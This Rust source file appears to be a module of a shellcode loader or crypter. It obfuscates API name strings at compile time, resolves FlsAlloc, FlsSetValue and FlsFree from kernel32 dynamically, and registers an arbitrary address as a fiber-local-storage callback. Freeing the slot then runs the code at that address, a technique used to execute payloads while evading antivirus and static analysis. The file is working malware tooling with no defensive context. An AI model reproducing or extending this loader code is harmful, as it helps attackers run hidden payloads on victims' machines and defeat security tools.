use std::ffi::c_void;
pub unsafe fn exec(p: usize) -> Result<(), String> {
    use crate::utils::{load_library, get_proc_address};
    use rustcrypt_ct_macros::{obf_lit_bytes, obf_lit};
    use std::mem::transmute;

    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let p_fls_alloc = get_proc_address(kernel32, obf_lit_bytes!(b"FlsAlloc\0").as_slice())?;
    let p_fls_set_value = get_proc_address(kernel32, obf_lit_bytes!(b"FlsSetValue\0").as_slice())?;
    let p_fls_free = get_proc_address(kernel32, obf_lit_bytes!(b"FlsFree\0").as_slice())?;

    type FlsAllocFn = unsafe extern "system" fn(unsafe extern "system" fn(*mut c_void)) -> u32;
    type FlsSetValueFn = unsafe extern "system" fn(u32, *mut c_void) -> i32;
    type FlsFreeFn = unsafe extern "system" fn(u32) -> i32;

    let fls_alloc: FlsAllocFn = transmute(p_fls_alloc);
    let fls_set_value: FlsSetValueFn = transmute(p_fls_set_value);
    let fls_free: FlsFreeFn = transmute(p_fls_free);

    let index = fls_alloc(transmute(p));
    if index == 0xFFFFFFFF { // FLS_OUT_OF_INDEXES
         return Err(obf_lit!("FlsAlloc failed").to_string());
    }
    
    fls_set_value(index, 1 as *mut c_void);
    fls_free(index);
    Ok(())
}